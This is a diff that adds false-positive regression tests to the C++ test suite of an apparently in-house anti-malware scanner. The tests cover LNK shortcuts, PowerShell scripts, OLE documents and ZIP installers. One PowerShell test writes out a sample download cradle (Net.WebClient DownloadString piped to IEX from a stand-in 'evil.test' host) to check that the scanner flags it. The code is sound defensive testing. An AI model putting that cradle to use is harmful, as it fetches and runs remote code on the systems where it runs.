@@ -3601,6 +3601,19 @@ void TestShellLinkParser() {
     }
     Expect(weaponized, "LNK scan: weaponized-shortcut finding surfaced");
   }
+
+  // --- Regression (FP review 2026-06-16): a benign shortcut that merely borrows
+  // a system binary's ICON (e.g. cmd.exe,0) must NOT read as weaponized. The
+  // LOLBin match excludes the presentation-only ICON_LOCATION field. ---
+  {
+    const uint32_t HasRelativePath = 0x08, HasIconLocation = 0x40;
+    auto v = header(HasRelativePath | HasIconLocation);
+    putAsciiSD(v, "..\\Documents\\quarterly-report.docx"); // benign target
+    putAsciiSD(v, "%SystemRoot%\\system32\\cmd.exe,0");     // borrowed icon only
+    const ShellLinkInfo info = ParseShellLink(v);
+    Expect(info.isLnk && !info.runsLolbin,
+           "LNK: borrowing cmd.exe's icon is not weaponized");
+  }
 }
 
 // Script analyzer: classification + malicious-pattern detection + one-layer
@@ -3778,6 +3791,42 @@ void TestScriptAnalyzer() {
     }
     Expect(url, "PS scan: deobfuscated C2 URL merged into IOC set");
   }
+
+  // --- Regression (FP review 2026-06-16): a benign admin/CI script that uses
+  // the first-class Invoke-WebRequest cmdlet plus the ubiquitous bypass/hidden
+  // launch flags must stay BELOW the Suspicious threshold (these alone are not
+  // a download cradle). ---
+  {
+    const std::string ps =
+        "Invoke-WebRequest -Uri https://contoso.example/setup.msi -OutFile "
+        "$env:TEMP\\setup.msi -ExecutionPolicy Bypass -WindowStyle Hidden";
+    const auto tmp =
+        std::filesystem::temp_directory_path() / "antimal_test_iwr.ps1";
+    {
+      std::ofstream os(tmp, std::ios::binary);
+      os.write(ps.data(), static_cast<std::streamsize>(ps.size()));
+    }
+    const antimal::ScanResult r = antimal::ScanFile(tmp);
+    std::error_code ec;
+    std::filesystem::remove(tmp, ec);
+    Expect(r.verdict != antimal::Verdict::Suspicious &&
+               r.verdict != antimal::Verdict::Malicious,
+           "PS scan: benign Invoke-WebRequest + bypass stays below Suspicious");
+    // A real Net.WebClient/DownloadString cradle must still reach Suspicious.
+    const std::string cradle =
+        "$c=New-Object Net.WebClient; IEX($c.DownloadString('http://evil.test/x'))";
+    const auto tmp2 =
+        std::filesystem::temp_directory_path() / "antimal_test_cradle.ps1";
+    {
+      std::ofstream os(tmp2, std::ios::binary);
+      os.write(cradle.data(), static_cast<std::streamsize>(cradle.size()));
+    }
+    const antimal::ScanResult r2 = antimal::ScanFile(tmp2);
+    std::filesystem::remove(tmp2, ec);
+    Expect(r2.verdict == antimal::Verdict::Suspicious ||
+               r2.verdict == antimal::Verdict::Malicious,
+           "PS scan: a true Net.WebClient + IEX cradle still reaches Suspicious");
+  }
 }
 
 // Container analyzer: OLE/OOXML macro detection + zip archive payload
@@ -3926,6 +3975,42 @@ void TestContainerAnalyzer() {
     z.resize(40, 0);
     const auto a = AnalyzeContainer(z, ".zip");
     Expect(a.isContainer, "garbage-after-PK still classified as a zip-family container");
+  }
+
+  // --- Regression (FP review 2026-06-16): a benign embedded "Package" object
+  // (Object Packager) must NOT be accused of the Equation Editor exploit. ---
+  {
+    auto b = buildOle({"Package"});
+    const auto a = AnalyzeContainer(b, ".doc");
+    Expect(!has(a, "ole.exploit_object"),
+           "OLE: benign packaged object is not an exploit-object FP");
+  }
+  // --- Regression: incidental "VBA" text in a macro-free OLE doc (e.g. a
+  // tutorial that mentions VBA) must NOT assert a macro project. ---
+  {
+    auto b = buildOle({"VBA"}); // the bare word, not the _VBA_PROJECT storage
+    const auto a = AnalyzeContainer(b, ".doc");
+    Expect(!a.hasMacros && !has(a, "macro.vba_present"),
+           "OLE: incidental 'VBA' text does not assert a macro project");
+  }
+
+  // --- Regression (end-to-end): a benign installer ZIP (setup.exe + app.dll +
+  // one password-protected entry) must stay BELOW the Suspicious threshold. ---
+  {
+    auto z = buildZip({{"setup.exe", false}, {"app.dll", false}, {"license.dat", true}});
+    const auto tmp =
+        std::filesystem::temp_directory_path() / "antimal_test_installer.zip";
+    {
+      std::ofstream os(tmp, std::ios::binary);
+      os.write(reinterpret_cast<const char *>(z.data()),
+               static_cast<std::streamsize>(z.size()));
+    }
+    const antimal::ScanResult r = antimal::ScanFile(tmp);
+    std::error_code ec;
+    std::filesystem::remove(tmp, ec);
+    Expect(r.verdict != antimal::Verdict::Suspicious &&
+               r.verdict != antimal::Verdict::Malicious,
+           "ZIP scan: benign installer (exe+dll+encrypted) stays below Suspicious");
   }
 }
 
